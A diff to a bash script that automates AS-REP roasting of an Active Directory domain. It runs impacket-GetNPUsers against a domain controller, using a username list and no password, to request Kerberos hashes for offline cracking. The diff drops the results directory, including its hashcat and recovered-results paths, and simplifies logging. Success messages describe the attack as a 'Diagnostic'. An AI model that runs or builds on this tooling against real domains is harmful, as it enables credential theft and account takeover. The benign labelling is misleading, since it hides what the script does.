@@ -14,16 +14,15 @@ USERNAME_FILE="${1:-}"
 WORDLIST="${2:-}"
 TARGET_IP="${3:-}"
 DOMAIN="${4:-}"
-RESULTS_DIR="${5:-}"
-
+OUTPUT_FILE="asrep_output.txt"
 # Argument Validation
 echo "========================================"
 echo "ARGUMENT VALIDATION"
 echo "========================================"
-
-if [[ -z "$USERNAME_FILE" || -z "$WORDLIST" || -z "$TARGET_IP" || -z "$DOMAIN" || -z "$RESULTS_DIR" ]]; then
-  echo "Usage: $0 <username_file> <wordlist> <target_ip> <domain> <results_dir>"
-  exit 1
+if [[ -z "$USERNAME_FILE" || -z "$WORDLIST" ||
+      -z "$TARGET_IP" || -z "$DOMAIN" ]]; then
+    echo "Usage: $0 <username_file> <wordlist> <target_ip> <domain>"
+    exit 1
 fi
 
 # Check required files exist and are readable
@@ -59,23 +58,11 @@ if [[ ! "$DOMAIN" =~ ^[[:alnum:]_.-]+$ ]]; then
   exit 1
 fi
 
-# Check if Results directory exists or create it
-if [[ -e "$RESULTS_DIR" && ! -d "$RESULTS_DIR" ]]; then
-  echo "Error: Results path exists but is not a directory."
-  exit 1
-fi
 
-mkdir -p -- "$RESULTS_DIR"
+
 
 echo "[SUCCESS] System setup completed."
 
-# Define output file paths
-IMPAKET_OUTPUT_LOG="$RESULTS_DIR/impacket_output.log"
-OUTPUT_FILE="$RESULTS_DIR/asrep_output.txt"
-HASH_INPUT_FILE="$RESULTS_DIR/hash_input.txt"
-HASHCAT_LOG="$RESULTS_DIR/hashcat.log"
-RECOVERED_RESULTS_FILE="$RESULTS_DIR/recovered_results.txt"
-DIAGNOSTIC_LOG="$RESULTS_DIR/system_check.log"
 
 echo "========================================"
 echo "DEFINED VARIABLES AND OUTPUT PATHS"
@@ -84,26 +71,30 @@ echo " Username file: $USERNAME_FILE"
 echo " Wordlist: $WORDLIST"
 echo " Target IP: $TARGET_IP"
 echo " Domain: $DOMAIN"
-echo " Results dir: $RESULTS_DIR"
 echo ""
 
 # Function to run logged commands safely
 run_logged() {
-  local log_file="$1"
-  shift
+    echo
+    printf '[INFO] Running:'
+    printf ' %q' "$@"
+    echo
+    echo "----------------------------------------"
 
-  echo "[INFO] Running: $@"
+    local status=0
+    "$@" 2>&1 || status=$?
 
-  if "$@" > "$log_file" 2>&1; then
-    echo "[SUCCESS] Command completed."
-    return 0
-  else
-    local status=$?
-    echo "[ERROR] Command failed with exit code $status."
-    echo "[ERROR] Check log: $log_file"
+    echo "----------------------------------------"
+
+    if [[ "$status" -eq 0 ]]; then
+        echo "[SUCCESS] Command completed."
+    else
+        echo "[ERROR] Command failed with exit code $status."
+    fi
+
     return "$status"
-  fi
 }
+
 
 echo "========================================"
 echo "EXECUTING IMPACKET WORKFLOW"
@@ -116,10 +107,7 @@ if [[ -z "${OUTPUT_FILE:-}" ]]; then
   exit 1
 fi
 
-if [[ ! -d "$(dirname -- "$OUTPUT_FILE")" ]]; then
-  echo "[ERROR] Output directory does not exist."
-  exit 1
-fi
+
 
 if [[ ! -r "$USERNAME_FILE" || ! -r "$WORDLIST" ]]; then
   echo "[ERROR] An input file is missing or unreadable."
@@ -128,15 +116,7 @@ fi
 
 echo "[INFO] Output path and input files validated."
 
-
-if run_logged "$IMPAKET_OUTPUT_LOG" impacket-GetNPUsers \
-  "$DOMAIN/" \
-  -dc-ip "$TARGET_IP" \
-  -usersfile "$USERNAME_FILE" \
-  -no-pass \
-  -request \
-  -format john \
-  -outputfile "$OUTPUT_FILE"
+if  impacket-GetNPUsers "$DOMAIN/" -dc-ip "$TARGET_IP"  -usersfile "$USERNAME_FILE"  -no-pass  -request   -format john  -outputfile "$OUTPUT_FILE"
   then
  echo "[SUCCESS] Diagnostic completed."
 else
